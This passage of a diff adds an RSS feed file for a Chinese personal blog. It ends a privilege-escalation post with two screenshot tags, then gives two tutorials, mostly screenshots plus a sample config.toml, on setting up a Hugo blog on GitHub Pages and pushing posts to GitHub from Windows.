+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection_input_pwd.png&#34; alt=&#34;Windows系统漏洞提权-远程连接输入用户名密码&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/privilge_escalation_win_remote_connection_success.png&#34; alt=&#34;Windows系统漏洞提权-远程连接成功&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Windows下向github推送博客</title>
+      <link>http://wyb0.com/posts/Windows%E4%B8%8B%E5%90%91github%E6%8E%A8%E9%80%81%E5%8D%9A%E5%AE%A2/</link>
+      <pubDate>Tue, 10 May 2016 15:22:20 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/Windows%E4%B8%8B%E5%90%91github%E6%8E%A8%E9%80%81%E5%8D%9A%E5%AE%A2/</guid>
+      <description>
+
+&lt;h2 id=&#34;开启本地服务:3ae6a2dd9c72816236f233578f4c27fc&#34;&gt;开启本地服务&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_add_open_git.png&#34; alt=&#34;.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_add_create_file.png&#34; alt=&#34;.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;编辑md文档:3ae6a2dd9c72816236f233578f4c27fc&#34;&gt;编辑md文档&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_add_edit_md.png&#34; alt=&#34;.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_add_visit_effect.png&#34; alt=&#34;.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;推送md文档:3ae6a2dd9c72816236f233578f4c27fc&#34;&gt;推送md文档&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_add_push_md.png&#34; alt=&#34;.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;推送html:3ae6a2dd9c72816236f233578f4c27fc&#34;&gt;推送html&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_add_md_to_html.png&#34; alt=&#34;.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_add_add_html.png&#34; alt=&#34;.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;查看推送是否成功:3ae6a2dd9c72816236f233578f4c27fc&#34;&gt;查看推送是否成功&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_add_visit_result.png&#34; alt=&#34;.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Windows下用github搭建博客</title>
+      <link>http://wyb0.com/posts/Windows%E4%B8%8B%E7%94%A8github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</link>
+      <pubDate>Tue, 10 May 2016 09:24:07 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/Windows%E4%B8%8B%E7%94%A8github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</guid>
+      <description>
+
+&lt;h2 id=&#34;首先在github上新建仓库:0bb7d6b4abea6e6ec98a6a38703ee58e&#34;&gt;首先在github上新建仓库&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_new_repository1.png&#34; alt=&#34;在github上新建仓库1.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_new_repository2.png&#34; alt=&#34;在github上新建仓库2.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;本地新建仓库:0bb7d6b4abea6e6ec98a6a38703ee58e&#34;&gt;本地新建仓库&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;下载安装hugo
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_install_hugo.png&#34; alt=&#34;本地安装hugo.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;为hugo添加环境变量
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_hugo_add_env.png&#34; alt=&#34;为hugo添加环境变量.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;下载安装github客户端
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_install_github.png&#34; alt=&#34;安装github客户端.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;新建仓库
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_local_new_repository.png&#34; alt=&#34;新建仓库.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;下载主题&lt;br /&gt;
+可以在&lt;a href=&#34;https://github.com/spf13/hugoThemes&#34;&gt;https://github.com/spf13/hugoThemes&lt;/a&gt; 下载你喜欢的主题&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_download_theme.png&#34; alt=&#34;下载博客主题.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;使用主题并查看效果
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_use_theme_and_start_server.png&#34; alt=&#34;使用主题并启动服务.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_view_blog.png&#34; alt=&#34;本地查看博客效果.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;本地环境配置:0bb7d6b4abea6e6ec98a6a38703ee58e&#34;&gt;本地环境配置&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;本地生成秘钥
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_local_create_key.png&#34; alt=&#34;本地生成key.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;在github保存秘钥
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_github_add_key1.png&#34; alt=&#34;向github添加key1.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_github_add_key2.png&#34; alt=&#34;向github添加key2.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_github_add_key3.png&#34; alt=&#34;向github添加key3.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;测试公钥是否添加成功
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_check_add_key.png&#34; alt=&#34;查看公钥是否添加成功.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;设置本地用户名和邮箱
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_local_set_username_email.png&#34; alt=&#34;设置本地用户名和邮箱.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;配置config-toml:0bb7d6b4abea6e6ec98a6a38703ee58e&#34;&gt;配置config.toml&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;# 将reber-9全部替换为你github的账户名，另外你也可以进行一些基本的设置
+baseurl = &amp;quot;http://reber-9.github.io&amp;quot;
+languageCode = &amp;quot;en-us&amp;quot;
+title = &amp;quot;reber-9&#39;s Blog&amp;quot;
+theme = &amp;quot;beautifulhugo&amp;quot;
+pygmentsUseClasses = false
+#disqusShortname = &amp;quot;XXX&amp;quot;
+#googleAnalytics = &amp;quot;XXX&amp;quot;
+
+[Params]
+  logo = &amp;quot;img/avatar-icon.png&amp;quot;
+  subtitle = &amp;quot;This is my personal blog&amp;quot;
+
+[Author]
+  name = &amp;quot;Some Person&amp;quot;
+  email = &amp;quot;123123123@163.com&amp;quot;
+  github = &amp;quot;reber-9&amp;quot;
+
+[[menu.main]]
+    name = &amp;quot;Blog&amp;quot;
+    url = &amp;quot;/&amp;quot;
+    weight = 1
+
+[[menu.main]]
+    name = &amp;quot;About&amp;quot;
+    url = &amp;quot;/page/about/&amp;quot;
+    weight = 2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;同步本地和远程仓库:0bb7d6b4abea6e6ec98a6a38703ee58e&#34;&gt;同步本地和远程仓库&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;用hugo将markdown文档生成html
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_md_to_html.png&#34; alt=&#34;用hugo将markdown文档生成html.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;初始化本地仓库并与远程仓库建立联系
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_init.png&#34; alt=&#34;初始化本地仓库并与远程仓库建立联系.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;添加生成的html、为本次push做注释、推送
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_add_html.png&#34; alt=&#34;添加生成的html.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_add_annotation.png&#34; alt=&#34;为本次push做注释.png&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&lt;br /&gt;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/win_github_blog_push_html.png&#34; alt=&#34;推送生成的html.png&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;访问博客:0bb7d6b4abea6e6ec98a6a38703ee58e&#34;&gt;访问博客&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;直接访问&lt;a href=&#34;http://reber-9.github.io&#34;&gt;http://reber-9.github.io&lt;/a&gt; 即可&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
